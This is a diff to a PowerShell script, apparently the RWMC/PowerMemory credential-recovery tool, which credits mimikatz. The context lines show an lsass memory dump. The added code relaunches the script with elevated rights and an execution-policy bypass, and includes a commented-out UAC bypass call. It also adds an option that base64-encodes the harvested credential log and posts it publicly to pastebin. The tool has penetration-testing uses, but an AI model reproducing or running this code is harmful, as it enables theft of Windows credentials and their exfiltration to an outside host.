@@ -1,4 +1,4 @@
-﻿#requires -version 3
+﻿#requires -version 2
 <#
 
 .SYNOPSIS         
@@ -13,7 +13,12 @@
     Thanks to Benjamin Delpy for his work on mimikatz and Francesco Picasso (@dfirfpi) for his work on DES-X.
 
 #>
-
+Param
+    (
+        [Parameter(Position = 0)]        
+        [String]
+        $relaunched = 0
+    )
 #---------------------------------------------------------[Initialisations]--------------------------------------------------------
 Set-StrictMode -version Latest
 
@@ -38,6 +43,8 @@ $adFlag = 0
 $osArchitecture = ""
 $operatingSystem = ""
 $server = ""
+$elevate = 0
+$dev_key = $null
 
 #----------------------------------------------------------[Declarations]----------------------------------------------------------
 
@@ -72,25 +79,33 @@ White-Rabbit
 
 # Prérequis
 Test-InternetConnection
-$adminFlag = Test-LocalAdminRights
 
-if($adminFlag -eq $false){
+if($relaunched -eq 0) {
+<#
+    if(!(Test-IsInLocalAdministratorsGroup)) {
+        $elevate = 1    
+        Bypass-UAC $scriptPath $logDirectoryPath
+    }
+    else {    #>
+$adminFlag = Test-LocalAdminRights
+if($adminFlag -eq $false){        
     Write-Host "You have to launch this script with " -nonewline; Write-Host "local Administrator rights!" -f Red    
-    $scriptPath = Split-Path $MyInvocation.InvocationName    
-    $RWMC = $scriptPath + "\RWMC.ps1"
+    $scriptPath = Split-Path $MyInvocation.InvocationName   
+    $RWMC = $scriptPath + "\RWMC.ps1 1"     
     $ArgumentList = 'Start-Process -FilePath powershell.exe -ArgumentList \"-ExecutionPolicy Bypass -File "{0}"\" -Verb Runas' -f $RWMC;
     Start-Process -FilePath powershell.exe -ArgumentList $ArgumentList -Wait -NoNewWindow;    
     Stop-Script
+}    
+    #}
 }
-
 Write-Host "================================================================================================"
-$remoteLocalFile = Read-Host 'Do you want use Active Directory cmdlets ?
+$activeDirectoryOrNot = Read-Host 'Do you want use Active Directory cmdlets ?
 1) Yes
 2) No
 0) Exit
 
 Enter menu number and press <ENTER>'
-switch ($remoteLocalFile){
+switch ($activeDirectoryOrNot){
     "1" {$adFlag = 1}
     "2" {$adFlag = 0}
     "Yes" {$adFlag = 1}
@@ -183,6 +198,30 @@ else {
     }
 }
 
+$exFiltrate = Read-Host 'Do you want exfiltrate the data (pastebin) ?
+1) Yes
+2) No
+0) Exit
+
+Enter menu number and press <ENTER>'
+switch ($exFiltrate){
+    "1" {$exFiltrate = 1}
+    "2" {$exFiltrate = 0}
+    "Yes" {$exFiltrate = 1}
+    "No" {$exFiltrate = 0}
+    "Y" {$exFiltrate = 1}
+    "N" {$exFiltrate = 0}
+    "0" {Stop-Script}    
+    default {Write-Output "The option could not be determined... Exfiltration will be not used";$exFiltrate = "0"}
+}
+if($exFiltrate -eq 1) {
+    $devKey = Read-Host 'What is your dev_key API (pastebin) ?
+
+    Enter your dev_key and press API <ENTER>'
+
+    $dev_key = $devKey
+}
+
 if($mode -eq "2r2" -or $mode -eq "232") {
     if($mode -eq "2r2") {
         $memoryWalker = "$scriptPath\debugger\2r2\cdb.exe"
@@ -214,8 +253,10 @@ if($dump -eq "gen"){
         &$dumpAProcessPath "lsass" "$logDirectoryPath"
     }
     else {
-        $process = Get-Process lsass 
-        Write-Minidump $process $logDirectoryPath
+        if($elevate -eq 0) {
+            $process = Get-Process lsass 
+            Write-Minidump $process $logDirectoryPath                
+        }
     }
 }
 else {
@@ -229,7 +270,7 @@ else {
         $file = $dump
     }
 }
-   
+
 if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2" -or $mode -eq "232") {    
     $chain = White-Rabbit1    
     Write-InFile $buffer $chain    
@@ -571,4 +612,15 @@ Remove-Item -Recurse -Force c:\symbols
 Write-Progress -Activity "Write informations in the log file" -status "Running..." -id 1
 End-Log -streamWriter $global:streamWriter
 notepad $logPathName
+
+if($exFiltrate -eq 1 -and ![string]::IsNullOrEmpty($dev_key)) {    
+    Write-Progress -Activity "Exfiltrate" -status "Running..." -id 1 
+    $dataToExfiltrate = Get-Content $logPathName
+    $utfEncodedBytes  = [System.Text.Encoding]::UTF8.GetBytes($dataToExfiltrate)
+    $pasteValue = [System.Convert]::ToBase64String($utfEncodedBytes)
+    $pasteName = "PowerMemory (Follow the White Rabbit)"    
+    $url = "https://pastebin.com/api/api_post.php"
+    $parameters = "&api_option=paste&api_dev_key=$dev_key&api_paste_name=$pasteName&api_paste_code=$pasteValue&api_paste_private=0" 
+    Post-HttpRequest $url $parameters
+}
 cls
